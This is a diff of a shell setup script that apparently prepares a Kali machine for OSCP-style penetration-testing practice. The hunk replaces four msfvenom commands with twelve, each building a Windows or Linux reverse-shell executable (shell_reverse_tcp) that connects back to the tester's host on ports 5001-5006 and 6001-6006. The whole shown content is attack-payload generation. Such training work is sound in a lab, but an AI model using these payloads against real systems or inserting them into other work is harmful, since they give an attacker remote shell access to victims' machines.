@@ -78,10 +78,18 @@ cd /home/kali/oscp/server
 
 # Payloads
 cd /home/kali/oscp/server/payloads
-msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5555 --out winrev1.exe
-msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5556 --out winrev2.exe
-msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6666 --format elf --out linrev1
-msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6667 --format elf --out linrev2
+msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5001 --out winrev1.exe
+msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5002 --out winrev2.exe
+msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5003 --out winrev3.exe
+msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5004 --out winrev4.exe
+msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5005 --out winrev5.exe
+msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5006 --out winrev6.exe
+msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6001 --format elf --out linrev1
+msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6002 --format elf --out linrev2
+msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6003 --format elf --out linrev3
+msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6004 --format elf --out linrev4
+msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6005 --format elf --out linrev5
+msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6006 --format elf --out linrev6
 
 # Privesc
 cd /home/kali/oscp/server/privesc
